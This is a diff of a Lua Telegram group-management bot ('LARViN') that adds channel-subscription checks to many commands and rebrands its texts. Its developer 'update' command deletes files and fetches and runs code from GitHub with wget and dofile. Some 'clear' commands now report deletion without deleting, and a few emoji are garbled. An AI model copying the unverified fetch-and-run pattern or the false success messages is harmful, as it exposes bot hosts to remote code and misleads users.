 send(msg.chat_id_, msg.id_,'☑┇تم تعطيل الايدي بالصوره') 
 end
 if text == 'تعين الايدي' and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:setex(bot_id.."LARViN:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
 local Text= [[
 ☑┇ ارسل الان النص
@@ -5119,7 +6295,16 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text == "سمايلات" or text == "سمايل" then
+if text == "سمايلات" or text == "سمايل" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 database:del(bot_id.."Tshak:Set:Sma"..msg.chat_id_)
 Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🍵","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","📌","📍","📓","📗","📂","📅","📪","📫","📬","📭","⏰","📺","🎚","☎️","📡"}
@@ -5195,7 +6380,16 @@ end
 database:set(bot_id.."Tshak:Speed:Tr"..msg.chat_id_,true)
 end 
 
-if text == "حزوره" then
+if text == "حزوره" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 database:del(bot_id.."Tshak:Set:Hzora"..msg.chat_id_)
 Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
@@ -5246,7 +6440,16 @@ end
 database:set(bot_id.."Tshak:Set:Hzora"..msg.chat_id_,true)
 end 
 
-if text == "معاني" then
+if text == "معاني" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 database:del(bot_id.."Tshak:Set:Maany"..msg.chat_id_)
 Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
@@ -5288,7 +6491,16 @@ database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)
 end
 database:set(bot_id.."Tshak:Set:Maany"..msg.chat_id_,true)
 end 
-if text == "العكس" then
+if text == "العكس" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 database:del(bot_id.."Tshak:Set:Aks"..msg.chat_id_)
 katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
@@ -5355,7 +6567,16 @@ end
 end
 end
 end
-if text == "خمن" or text == "تخمين" then   
+if text == "خمن" or text == "تخمين" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end   
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 Num = math.random(1,20)
 database:set(bot_id.."Tshak:GAMES:NUM"..msg.chat_id_,Num) 
@@ -5383,7 +6604,16 @@ end
 end
 end
 
-if text == "محيبس" or text == "بات" then
+if text == "محيبس" or text == "بات" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then   
 Num = math.random(1,6)
 database:set(bot_id.."Tshak:Games:Bat"..msg.chat_id_,Num) 
@@ -5400,13 +6630,22 @@ return false
 end
 end
 
-if text == "المختلف" then
+if text == "المختلف" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","🧜‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
 name = mktlf[math.random(#mktlf)]
 database:del(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_)
 database:set(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_,name)
-name = string.gsub(name,"😸","😹😹??😹😹😹😹😹😸😹😹😹😹")
+name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
 name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
 name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
 name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
@@ -5417,7 +6656,7 @@ name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
 name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
 name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
 name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
-name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
+name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍??👩‍🔬")
 name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
 name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
 name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
@@ -5444,7 +6683,16 @@ database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)
 end
 database:set(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_,true)
 end
-if text == "امثله" then
+if text == "امثله" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
 name = mthal[math.random(#mthal)]
@@ -5482,15 +6730,42 @@ database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)
 end
 database:set(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_,true)
 end
-if text == "تعطيل الالعاب" and Owner(msg) then   
+if text == "تعطيل الالعاب" and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end   
 database:del(bot_id.."Tshak:Lock:Games"..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,"\n☑┇تم تعطيل الالعاب") 
 end
 if text == "تفعيل الالعاب" and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end  
 database:set(bot_id.."Tshak:Lock:Games"..msg.chat_id_,true) 
 send(msg.chat_id_, msg.id_,"\n☑┇تم تفعيل الالعاب") 
 end
-if text == 'الالعاب' then
+if text == 'الالعاب' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Teext = [[
 📛┇قائمه الالعاب الموجوده
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
@@ -5509,38 +6784,71 @@ Teext = [[
 ]]
 send(msg.chat_id_, msg.id_,Teext) 
 end
-if text == 'رسائلي' then
+if text == 'رسائلي' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local nummsg = database:get(bot_id..'LARViN:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 1
 local Text = '📨┇عدد رسائلك هنا *~ '..nummsg..'*'
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'مسح رسائلي' then
-database:del(bot_id..'LARViN:messageUser'..msg.chat_id_..':'..msg.sender_user_id_)
 local Text = '☑┇تم مسح جميع رسائلك '
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'سحكاتي' or text == 'تعديلاتي' then
+if text == 'سحكاتي' or text == 'تعديلاتي' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local edit = database:get(bot_id..'LARViN:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
 local Text = '✏┇عدد التعديلات هنا *~ '..edit..'*'
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
-database:del(bot_id..'LARViN:message_edit'..msg.chat_id_..':'..msg.sender_user_id_)
 local Text = '☑┇تم مسح جميع تعديلاتك '
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'جهاتي' then
+if text == 'جهاتي' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local addmem = database:get(bot_id.."LARViN:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
 local Text = '👥┇عدد جهاتك المضافه هنا *~ '..addmem..'*'
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'مسح جهاتي' then
-database:del(bot_id..'LARViN:Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
 local Text = '☑┇تم مسح جميع جهاتك المضافه '
 send(msg.chat_id_, msg.id_,Text) 
 end
 
-if text == "مجوهراتي" then 
+if text == "مجوهراتي" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 local Num = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
 if Num == 0 then 
 Text = "📫┇لم تلعب اي لعبه للحصول على جواهر"
@@ -5549,7 +6857,16 @@ Text = "📮┇عدد جواهر التي رحبتها هي *~ { "..Num.." } م�
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text and text:match("^بيع مجوهراتي (%d+)$") then
+if text and text:match("^بيع مجوهراتي (%d+)$") then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local NUMPY = text:match("^بيع مجوهراتي (%d+)$") 
 if tonumber(NUMPY) == tonumber(0) then
 send(msg.chat_id_,msg.id_,"\n*📮┇لا استطيع البيع اقل من 1 *") 
@@ -5601,7 +6918,16 @@ database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..iduserr,numadded)
 send(msg.chat_id_, msg.id_,"☑┇تم اضافة له {"..numadded.."} من المجوهرات")  
 end
 ------------------------------------------------------------
-if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
+if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end    
 taha = text:match("^اضف رسائل (%d+)$")
 database:set(bot_id.."Tshak:id:user"..msg.chat_id_,taha)  
 database:setex(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
@@ -5609,13 +6935,31 @@ send(msg.chat_id_, msg.id_, "✉┇ارسل لي عدد الرسائل الان"
 return false
 end
 if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end  
 taha = text:match("^اضف مجوهرات (%d+)$")
 database:set(bot_id.."Tshak:idgem:user"..msg.chat_id_,taha)  
 database:setex(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 send(msg.chat_id_, msg.id_, "💠┇ارسل لي عدد المجوهرات الان") 
 return false
 end
-if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
+if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local Num = text:match("^اضف مجوهرات (%d+)$")
 function reply(extra, result, success)
 database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..result.sender_user_id_,Num)  
@@ -5714,8 +7058,8 @@ if text == ("تحديث السورس") and DevLARViN(msg) then
 send(msg.chat_id_,msg.id_,'☑┇تم التحديث')
 os.execute('rm -rf LARViN.lua')
 os.execute('rm -rf start.lua')
-download_to_file('https://raw.githubusercontent.com/LARViNTeam/LARViN/master/LARViN.lua', 'LARViN.lua') 
-download_to_file('https://raw.githubusercontent.com/LARViNTeam/LARViN/master/start.lua', 'start.lua') 
+os.execute('wget https://raw.githubusercontent.com/LARViNTeam/LARViN/master/LARViN.lua')
+os.execute('wget https://raw.githubusercontent.com/LARViNTeam/LARViN/master/start.lua')
 dofile('LARViN.lua')  
 return false
 end
@@ -5835,7 +7179,7 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n📂┇اهلا بك في متجر ملفات تشاكي \n📮┇الملفات الموجوده حاليا \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n\n"
+local TextS = "\n📂┇اهلا بك في متجر ملفات لارفين\n📮┇يوجد في المتجر ملف الردود\n⚙┇يتم ادراج الملفات في التحديثات القادمه \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
 local TextE = "\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n📌┇تدل علامة (✔) الملف مفعل\n".."📌┇تدل علامة (✖) الملف معطل\n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
@@ -5847,7 +7191,7 @@ else
 CeckFile = "(✖)"
 end
 NumFile = NumFile + 1
-TextS = TextS..'*'..NumFile.."~⪼* {`"..name..'`} » '..CeckFile..'\n[- File Information]('..Info..')\n'
+TextS = TextS..'*'..NumFile.."~⪼* {`"..name..'`} » '..CeckFile..'\n[-  About to the file]('..Info..')\n'
 end
 send(msg.chat_id_, msg.id_,TextS..TextE) 
 end
@@ -5910,27 +7254,6 @@ local Users = database:smembers('LARViN:'..bot_id.."userss")
 local Groups = database:smembers('LARViN:'..bot_id..'groups') 
 for i = 1, #Groups do
 database:sadd(bot_id..'LARViN:Chek:Groups',Groups[i])  
-local list1 = database:smembers('LARViN:'..bot_id..'creatorbasic:'..Groups[i])
-for k,v in pairs(list1) do
-database:sadd(bot_id.."LARViN:Basic:Constructor"..Groups[i], v)
-end
-local list2 = database:smembers('LARViN:'..bot_id..'creator:'..Groups[i])
-for k,v in pairs(list2) do
-database:sadd(bot_id.."LARViN:Constructor"..Groups[i], v)
-end
-local list3 = database:smembers('LARViN:'..bot_id..'owners:'..Groups[i])
-for k,v in pairs(list3) do
-database:sadd(bot_id.."LARViN:Manager"..Groups[i], v)
-end
-local list4 = database:smembers('LARViN:'..bot_id..'mods:'..Groups[i])
-for k,v in pairs(list4) do
-database:sadd(bot_id.."LARViN:Mod:User"..Groups[i], v)
-end
-database:set(bot_id.."LARViN:Lock:tagservrbot"..Groups[i],true)   
-list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
-for i,lock in pairs(list) do 
-database:set(bot_id..'LARViN:'..lock..Groups[i],"del")    
-end
 end
 for i = 1, #Users do
 database:sadd(bot_id..'LARViN:UsersBot',Users[i])  
@@ -5942,18 +7265,18 @@ database:del(bot_id..'LARViN:Text_Dev')
 send(msg.chat_id_, msg.id_,'☑┇ تم حذف كليشه المطور')
 end
 if text == 'وضع كليشه المطور' and DevLARViN(msg) then
-database:set(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_,true)
+database:set(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_,true)
 send(msg.chat_id_,msg.id_,'📫┇ ارسل الكليشه الان')
 return false
 end
-if text and database:get(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_) then
+if text and database:get(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_) then
 if text == 'الغاء' then 
-database:del(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
+database:del(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_)
 send(msg.chat_id_,msg.id_,'🔖┇تم الغاء حفظ كليشة المطور')
 return false
 end
 database:set(bot_id..'LARViN:Text_Dev',text)
-database:del(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
+database:del(bot_id..'LARViN:Set:Text_Dev'..msg.chat_id_)
 send(msg.chat_id_,msg.id_,'🔰┇تم حفظ كليشة المطور')
 return false
 end
@@ -5973,26 +7296,34 @@ if text == "تحديث" and DevLARViN(msg) then
 dofile("LARViN.lua")  
 send(msg.chat_id_, msg.id_, "☑┇تم التحديث")
 end
-if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then
+if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
-🔰 Welcome to Source 🔰
+اهلا  بك في سورس لارفين ،
 
-🌐┇LARViN TEAM 
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📊┇ [Source Channel](https://t.me/Source_Milano)
 
-📋┇ [LARViN Dev](https://t.me/Source_Milano)
-
-📁┇ [Source  Files](https://t.me/LARViN_sudo)
-
-🌐┇ [LARViN iNDT](https://t.me/Source_Milano/4611)
- 
- ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
-📧┇ [TWS LARViN](https://t.me/A_5bot)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 end
-if text == 'الاوامر' and Addictive(msg) then
+
+if text == 'الاوامر' and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
 📮┇هناك {5} اوامر لعرضها
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -6002,12 +7333,21 @@ Text = [[
 🎖┇م4 ~⪼ لعرض اوامر المنشئين
 👤┇م5 ~⪼ لعرض اوامر المطورين
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
 end
-if text == 'م1' and Addictive(msg) then
+if text == 'م1' and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
 📮┇ اوامر حمايه المجموعه
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -6027,7 +7367,7 @@ Text = [[
 🔐┇الملصقات
 🔐┇الفيديو
 🔐┇الانلاين
-🔐┇الدردشه
+??┇الدردشه
 🔐┇التوجيه
 🔐┇الاغاني
 🔐┇الصوت
@@ -6040,12 +7380,21 @@ Text = [[
 🔐┇الكلايش
 🔐┇السيلفي
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼ [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
 end
-if text == 'م2' and Addictive(msg) then
+if text == 'م2' and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
 🥈┇اوامر الادمنيه
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -6106,12 +7455,21 @@ Text = [[
 📮┇الصلاحيات
 📮┇الرابط
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
 end
-if text == 'م3' and Owner(msg) then
+if text == 'م3' and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
